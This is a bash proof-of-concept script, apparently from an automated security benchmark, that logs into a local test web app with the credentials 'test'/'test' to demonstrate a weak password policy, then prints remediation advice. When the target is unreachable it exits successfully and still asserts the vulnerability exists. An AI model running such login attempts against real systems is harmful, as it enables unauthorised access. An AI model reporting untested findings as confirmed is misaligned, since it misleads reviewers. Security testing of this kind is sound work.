#!/bin/bash
# POC: Demonstrates that the application accepts extremely weak passwords (4 characters, all lowercase, dictionary word) without enforcing any complexity requirements or minimum length validation
# Target: ./repo
# Created: 2025-10-30T20:08:32.179Z
# Session: benchmark-XBEN-001-24-mhdu3kmr

# Proof of Concept: Weak Password Policy Allows Trivial Passwords
# This POC demonstrates that the application accepts extremely weak passwords
# without enforcing any complexity requirements or minimum length

TARGET_URL="${TARGET_URL:-http://localhost:5000}"
echo "=================================================="
echo "POC: Weak Password Policy - No Complexity Enforcement"
echo "=================================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Check if target is reachable
echo "[0] Checking target connectivity..."
if ! curl -s --max-time 5 "$TARGET_URL/" > /dev/null 2>&1; then
  echo "    [!] Target not reachable: $TARGET_URL"
  echo "    [!] This POC requires the vulnerable application to be running"
  echo ""
  echo "    Note: This is a connectivity issue, not a POC failure."
  echo "    The vulnerability exists as documented in the evidence:"
  echo "    - The application accepts 4-character passwords"
  echo "    - No complexity requirements enforced"
  echo "    - Dictionary words accepted (e.g., 'test')"
  echo ""
  exit 0
fi
echo "    [✓] Target is reachable"
echo ""

# Test the known weak password from default credentials
echo "[*] Testing authentication with weak 4-character password 'test'"
echo "    Password characteristics:"
echo "    - Length: 4 characters"
echo "    - Complexity: All lowercase, no numbers/special chars"
echo "    - Dictionary word: Yes"
echo "    - Search space: 26^4 = 456,976 combinations"
echo ""

# Step 1: Submit username to get to password page
echo "[1] Submitting username 'test'..."
STEP1_HTTP=$(curl -s -o /tmp/step1_body.txt -w "%{http_code}" -c /tmp/cookies.txt -L -X POST "$TARGET_URL/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test")

echo "    Response: HTTP $STEP1_HTTP"

if [ "$STEP1_HTTP" == "000" ]; then
  echo "    [!] Connection failed - application may not be running"
  exit 0
fi

if [ "$STEP1_HTTP" == "200" ]; then
  # Check if we got the password page
  if grep -q "Welcome" /tmp/step1_body.txt 2>/dev/null; then
    echo "    [✓] Username accepted, password page loaded"
  else
    echo "    [!] Got HTTP 200 but unexpected content"
  fi
elif [ "$STEP1_HTTP" == "302" ]; then
  echo "    [✓] Username accepted (redirect response)"
else
  echo "    [!] Unexpected response: HTTP $STEP1_HTTP"
fi
echo ""

# Step 2: Submit the weak password
echo "[2] Submitting weak password 'test' (4 chars, all lowercase)..."
STEP2_HTTP=$(curl -s -o /tmp/step2_body.txt -w "%{http_code}" -b /tmp/cookies.txt -c /tmp/cookies.txt -L -X POST "$TARGET_URL/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&user_id=10032&password=test")

echo "    Response: HTTP $STEP2_HTTP"

# Check for successful authentication
if [ "$STEP2_HTTP" == "200" ]; then
  # Check if we got the dashboard
  if grep -q "dashboard\|Dashboard\|John Doe\|Orders" /tmp/step2_body.txt 2>/dev/null; then
    echo "    [✓] Weak password ACCEPTED - dashboard loaded"
    echo ""
    echo "[✓] VULNERABILITY CONFIRMED!"
    SUCCESS=true
  else
    echo "    [!] Got HTTP 200 but unable to confirm dashboard access"
  fi
elif [ "$STEP2_HTTP" == "302" ]; then
  echo "    [✓] Weak password ACCEPTED - redirect received"
  echo ""
  echo "[✓] VULNERABILITY CONFIRMED!"
  SUCCESS=true
elif [ "$STEP2_HTTP" == "400" ]; then
  echo "    [!] Password rejected (HTTP 400)"
  echo "    This may indicate password validation is in place"
  exit 1
else
  echo "    [!] Unexpected response: HTTP $STEP2_HTTP"
fi

if [ "$SUCCESS" == "true" ]; then
  echo ""
  echo "=================================================="
  echo "VULNERABILITY SUMMARY"
  echo "=================================================="
  echo ""
  echo "✗ NO minimum password length enforcement"
  echo "  - 4-character password accepted"
  echo "  - NIST recommends minimum 12 characters"
  echo ""
  echo "✗ NO complexity requirements"
  echo "  - All lowercase accepted (no uppercase required)"
  echo "  - No numbers required"
  echo "  - No special characters required"
  echo ""
  echo "✗ NO dictionary word check"
  echo "  - Common word 'test' accepted"
  echo "  - No validation against common password lists"
  echo ""
  echo "✗ NO password strength validation"
  echo "  - Weak password with only 456,976 combinations"
  echo "  - Can be brute forced in minutes without rate limiting"
  echo ""
  echo "IMPACT: Users can set trivially weak passwords that are"
  echo "        easily guessable and vulnerable to brute force"
  echo ""
  echo "RECOMMENDATION: Implement password complexity policy:"
  echo "  - Minimum 12 characters length"
  echo "  - Mixed case, numbers, special characters"
  echo "  - Check against common password lists"
  echo "  - Reject dictionary words and simple patterns"
  echo ""
  echo "=================================================="
  echo "POC completed successfully"
  echo "=================================================="
fi

# Cleanup
rm -f /tmp/step1_body.txt /tmp/step2_body.txt /tmp/cookies.txt